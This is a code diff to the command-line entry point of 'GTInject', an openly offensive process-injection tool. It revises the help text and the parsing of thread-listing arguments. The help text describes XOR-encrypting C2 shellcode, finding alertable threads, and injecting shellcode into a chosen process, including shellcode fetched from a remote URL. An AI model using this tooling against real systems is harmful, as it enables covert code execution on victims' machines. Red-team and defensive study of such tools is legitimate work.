@@ -9,6 +9,7 @@ using GTInject.Injection;
 using System.Diagnostics;
 using System.Diagnostics.SymbolStore;
 using GTInject.Novel;
+using System.Net.Sockets;
 
 namespace GTInject
 {
@@ -39,8 +40,6 @@ namespace GTInject
             else if (command.ToLower() == "help") 
             {
                 string helptext = @"
-GTInject.exe Help Menu
-
 Usage: GTInject.exe <module> <moduleArgs>
        GTInject.exe threads
        GTInject.exe encrypt pathToSource.bin MySecretXorKey
@@ -48,24 +47,36 @@ Usage: GTInject.exe <module> <moduleArgs>
 
        GTInject.exe inject 100 100 SecretKey123 disk ""C:\path\to\xordShellcode.file\"" 1234 321
 
-Encrypt  -- for encrypting shellcode:
-        Shellcode from your C2 will be multibyte XOR'd and written as a base64 string in a text file
+Modules: 
+    Encrypt
+    Threads
+    Inject
+
+Encrypt:
+        -- GTInject.exe encrypt C2Shellcode.bin MySecretXorKey --
+        For encrypting shellcode. Shellcode from your C2 will be multibyte XOR'd and written as output to a text file
         This is intended to help you use the injection option later
-        This is also my utility for encrypting payloads to be used in shellcode runners
+        This is also my utility for encrypting payloads to be used in runners
 
         Do this in preparation, not on the C2 victim machine.
 
-Threads  -- check for alertable threads:
-        This will list all threads and their current execution state
-        This is intended to help identify alertable threads, for injection options.
+Threads:
+        -- GTInject.exe threads alertable 10234 --
+        Specify 'alertable' or 'all' threads
+        Optionally specify a process ID
+        Default will list all threads in an alertable state for all processes. Filters out low integrity processes to avoid isolated AppContainer threads.
 
-Inject   -- choose a process injection method
-        Choose a technique for allocating the memory
+Inject:
+        -- GTInject.exe inject 100 102 MySecretXorKey disk 'C:\path\to\shellcode.bin' 10243 --
+        Choose a technique for allocating the memory 
         Then choose a technique for executing the thread
         Enter the XorKey to decrypt it with
         Specify a location type where the encrypted shellcode is stored 
-        Specify the location
+            - embedded 0
+            - url https://globetech.biz/hostedShellcode.b64
+            - disk 'C:\path\to\xord-shellcode.bin'
         Specify the PID
+        Optionally specify the Thread Id after the Process ID -- gtinject.exe 100 101 MySecretXorKey embedded 0 10452 1337
 
 100 Series - WINAPI
 200 Series - NTAPI 
@@ -116,16 +127,31 @@ ThreadExec Options
 
             else if (command.ToLower() == "threads")
             {
-                bool filterUntrusted = true; // by default, remove untrusted / Low integrity processes from view - Things like AppContainer aren't often worth reviewing
+                // Write to accept GTInject.exe threads all/alertable optionalPid
+                string threadsToReturn = "alertable";
+                int optionalPidForThreads = 0;
                 try
                 {
-                    filterUntrusted = bool.Parse(args[1]);
+                    threadsToReturn = args[1];
                 }
-                catch
+                catch  (IndexOutOfRangeException ex)
                 {
-                    Console.WriteLine("     Won't show Untrusted or Low integrity process, use GTInject.exe threads false to turn off filtering");
+                    Console.WriteLine("Returning Alertable Threads");
                 }
-                AlertableThreads.Alertable.GetThreads(filterUntrusted);
+
+                try
+                {
+                    optionalPidForThreads = int.Parse(args[2]);
+                }
+                catch (IndexOutOfRangeException ex)
+                {
+                    Console.WriteLine(" Optional PID not specified, assuming all processes\n"); // Default is all Processes 
+                }
+
+                // no longer bothering with a filter option, remove low and untrusted as they are typically going to be unreliable choices
+                // bool filterUntrusted = true; // by default, remove untrusted / Low integrity processes from view - Things like AppContainer aren't often worth reviewing
+
+                try { AlertableThreads.Alertable.GetThreads(threadsToReturn, optionalPidForThreads); } catch (Exception ex) { Console.WriteLine(ex.ToString()); }
             }
 
             else if (command.ToLower() == "inject")
